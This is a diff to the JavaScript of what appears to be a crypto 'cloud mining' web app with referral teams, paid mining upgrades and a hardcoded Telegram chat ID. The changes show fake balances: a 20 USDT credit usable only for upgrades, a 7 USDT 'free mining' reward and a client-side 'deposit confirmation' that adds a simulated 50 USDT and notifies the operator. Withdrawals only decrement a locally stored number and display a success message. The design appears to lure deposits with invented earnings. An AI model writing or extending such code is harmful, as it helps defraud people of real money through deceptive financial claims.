@@ -4,7 +4,8 @@ const TELEGRAM_CHAT_ID = '7417215529';
 
 // User Data
 let userData = {
-    balance: 0,
+    brokerBalance: 20, // Initial 20 USDT for all users
+    fundBalance: 0,
     miningLevel: 1,
     miningActive: false,
     miningStartTime: null,
@@ -12,7 +13,8 @@ let userData = {
     directTeam: 0,
     totalTeam: 0,
     teamEarnings: 0,
-    referralCode: 'SOL-7X9P2Q'
+    referralCode: 'SOL-7X9P2Q',
+    freeMiningUsed: false
 };
 
 // Mining Tools Data
@@ -58,7 +60,8 @@ const claimMiningBtn = document.getElementById('claim-mining-btn');
 const miningSpeedEl = document.getElementById('mining-speed');
 const minedAmountEl = document.getElementById('mined-amount');
 const miningTimeEl = document.getElementById('mining-time');
-const userBalanceEl = document.getElementById('user-balance');
+const brokerBalanceEl = document.getElementById('broker-balance');
+const fundBalanceEl = document.getElementById('fund-balance');
 const upgradeGrid = document.getElementById('upgrade-grid');
 const directTeamEl = document.getElementById('direct-team');
 const totalTeamEl = document.getElementById('total-team');
@@ -75,6 +78,7 @@ const closeDepositModal = document.getElementById('close-deposit-modal');
 const depositMethod = document.getElementById('deposit-method');
 const depositAddress = document.getElementById('deposit-address');
 const copyAddressBtn = document.getElementById('copy-address');
+const confirmDepositBtn = document.getElementById('confirm-deposit');
 const inviteModal = document.getElementById('invite-modal');
 const closeInviteModal = document.getElementById('close-invite-modal');
 const referralLink = document.getElementById('referral-link');
@@ -82,10 +86,11 @@ const copyLinkBtn = document.getElementById('copy-link');
 const networkOptions = document.querySelectorAll('.network-option');
 const withdrawAddress = document.getElementById('withdraw-address');
 const withdrawAmount = document.getElementById('withdraw-amount');
-const securityPassword = document.getElementById('security-password');
 const actualArrival = document.getElementById('actual-arrival');
 const confirmWithdraw = document.getElementById('confirm-withdraw');
 const amountOptions = document.querySelectorAll('.btn-amount-option');
+const withdrawBrokerBalanceEl = document.getElementById('withdraw-broker-balance');
+const withdrawFundBalanceEl = document.getElementById('withdraw-fund-balance');
 
 // Initialize the application
 function init() {
@@ -130,6 +135,7 @@ function setupEventListeners() {
     closeDepositModal.addEventListener('click', closeModal);
     depositMethod.addEventListener('change', updateDepositAddress);
     copyAddressBtn.addEventListener('click', copyDepositAddress);
+    confirmDepositBtn.addEventListener('click', confirmDeposit);
 
     // Invite
     closeInviteModal.addEventListener('click', closeModal);
@@ -146,7 +152,7 @@ function setupEventListeners() {
     amountOptions.forEach(option => {
         option.addEventListener('click', () => {
             const percent = option.getAttribute('data-percent');
-            withdrawAmount.value = (userData.balance * percent / 100).toFixed(2);
+            withdrawAmount.value = (userData.brokerBalance * percent / 100).toFixed(2);
             updateActualArrival();
         });
     });
@@ -185,7 +191,10 @@ function switchTab(tabName) {
 
 // Update UI with user data
 function updateUI() {
-    userBalanceEl.textContent = userData.balance.toFixed(2);
+    brokerBalanceEl.textContent = userData.brokerBalance.toFixed(2);
+    fundBalanceEl.textContent = userData.fundBalance.toFixed(2);
+    withdrawBrokerBalanceEl.textContent = userData.brokerBalance.toFixed(2) + ' USDT';
+    withdrawFundBalanceEl.textContent = userData.fundBalance.toFixed(2) + ' USDT';
     directTeamEl.textContent = userData.directTeam;
     totalTeamEl.textContent = userData.totalTeam;
     teamEarningsEl.textContent = userData.teamEarnings.toFixed(2);
@@ -224,18 +233,19 @@ function renderUpgradeTools() {
 
 // Start mining
 function startMining() {
-    if (userData.balance < 10) {
-        showNotification('Insufficient balance. Minimum 10 USDT required to start mining.', 'error');
-        openDepositModal();
+    if (userData.freeMiningUsed) {
+        showNotification('Free mining already used. Please upgrade to continue mining.', 'error');
+        switchTab('upgrade');
         return;
     }
 
     userData.miningActive = true;
     userData.miningStartTime = Date.now();
+    userData.freeMiningUsed = true;
     startMiningBtn.style.display = 'none';
     claimMiningBtn.style.display = 'inline-flex';
     
-    showNotification('Mining started successfully!', 'success');
+    showNotification('Free mining started successfully! Mine for 12 hours to claim 7 USDT.', 'success');
     updateMiningStatus();
 }
 
@@ -245,25 +255,30 @@ function claimMining() {
     
     const miningTime = Date.now() - userData.miningStartTime;
     const hoursMined = miningTime / (1000 * 60 * 60);
-    const currentTool = miningTools[userData.miningLevel - 1];
-    const minedSOL = (currentTool.dailyOutput / 24) * hoursMined;
     
-    userData.minedAmount += minedSOL;
+    // Check if 12 hours have passed
+    if (hoursMined < 12) {
+        showNotification(`Mining not complete. ${(12 - hoursMined).toFixed(1)} hours remaining.`, 'error');
+        return;
+    }
+    
+    // Add 7 USDT to fund balance
+    userData.fundBalance += 7;
     userData.miningActive = false;
     userData.miningStartTime = null;
     
     startMiningBtn.style.display = 'inline-flex';
     claimMiningBtn.style.display = 'none';
     
-    showNotification(`Successfully claimed ${minedSOL.toFixed(2)} SOL!`, 'success');
+    showNotification('Successfully claimed 7 USDT from free mining!', 'success');
+    updateUI();
     updateMiningStatus();
 }
 
 // Update mining status
 function updateMiningStatus() {
     if (userData.miningActive) {
-        const currentTool = miningTools[userData.miningLevel - 1];
-        const miningSpeed = currentTool.dailyOutput / 24;
+        const miningSpeed = 7 / 12; // 7 USDT over 12 hours
         miningSpeedEl.textContent = miningSpeed.toFixed(2);
         
         const elapsedTime = Date.now() - userData.miningStartTime;
@@ -282,8 +297,8 @@ function updateMiningStatus() {
         
         // Update mined amount
         const hoursMined = elapsedTime / (1000 * 60 * 60);
-        const minedSOL = (currentTool.dailyOutput / 24) * hoursMined;
-        minedAmountEl.textContent = minedSOL.toFixed(2);
+        const minedUSDT = (7 / 12) * hoursMined;
+        minedAmountEl.textContent = minedUSDT.toFixed(2);
         
         setTimeout(updateMiningStatus, 1000);
     } else {
@@ -297,8 +312,8 @@ function updateMiningStatus() {
 function purchaseMiningTool(toolId) {
     const tool = miningTools[toolId - 1];
     
-    if (userData.balance < tool.price) {
-        showNotification('Insufficient balance. Please deposit more USDT.', 'error');
+    if (userData.brokerBalance < tool.price) {
+        showNotification('Insufficient broker balance. Please deposit more USDT.', 'error');
         openDepositModal();
         return;
     }
@@ -306,7 +321,7 @@ function purchaseMiningTool(toolId) {
     showLoadingScreen();
     
     setTimeout(() => {
-        userData.balance -= tool.price;
+        userData.brokerBalance -= tool.price;
         userData.miningLevel = toolId;
         
         hideLoadingScreen();
@@ -351,6 +366,25 @@ function copyDepositAddress() {
         });
 }
 
+// Confirm deposit
+function confirmDeposit() {
+    showLoadingScreen();
+    
+    setTimeout(() => {
+        // Simulate deposit confirmation
+        const depositAmount = 50; // Simulated deposit amount
+        userData.brokerBalance += depositAmount;
+        
+        hideLoadingScreen();
+        showNotification(`Deposit confirmed! ${depositAmount} USDT added to your broker balance.`, 'success');
+        updateUI();
+        closeModal();
+        
+        // Send Telegram notification
+        sendTelegramMessage(`User confirmed deposit of ${depositAmount} USDT`);
+    }, 2000);
+}
+
 // Open deposit modal
 function openDepositModal() {
     depositModal.style.display = 'flex';
@@ -385,7 +419,6 @@ function processWithdrawal() {
     const selectedNetwork = document.querySelector('.network-option.active').getAttribute('data-network');
     const address = withdrawAddress.value.trim();
     const amount = parseFloat(withdrawAmount.value);
-    const password = securityPassword.value;
     
     if (!address) {
         showNotification('Please enter a withdrawal address', 'error');
@@ -397,20 +430,15 @@ function processWithdrawal() {
         return;
     }
     
-    if (amount > userData.balance) {
-        showNotification('Insufficient balance for withdrawal', 'error');
-        return;
-    }
-    
-    if (!password) {
-        showNotification('Please enter your security password', 'error');
+    if (amount > userData.fundBalance) {
+        showNotification('Insufficient fund balance for withdrawal', 'error');
         return;
     }
     
     showLoadingScreen();
     
     setTimeout(() => {
-        userData.balance -= amount;
+        userData.fundBalance -= amount;
         
         hideLoadingScreen();
         showNotification('Withdrawal request submitted successfully. It may take up to 24 hours to process.', 'success');
@@ -422,7 +450,6 @@ function processWithdrawal() {
         // Reset form
         withdrawAddress.value = '';
         withdrawAmount.value = '';
-        securityPassword.value = '';
         updateActualArrival();
     }, 2000);
 }
@@ -479,9 +506,15 @@ function sendTelegramMessage(message) {
 function loadUserData() {
     const savedData = localStorage.getItem('solCoinUserData');
     if (savedData) {
-        userData = { ...userData, ...JSON.parse(savedData) };
-        updateUI();
+        const parsedData = JSON.parse(savedData);
+        userData = { ...userData, ...parsedData };
+        
+        // Ensure initial 20 USDT is always available for new users
+        if (!parsedData || parsedData.brokerBalance === undefined) {
+            userData.brokerBalance = 20;
+        }
     }
+    updateUI();
 }
 
 // Save user data to localStorage
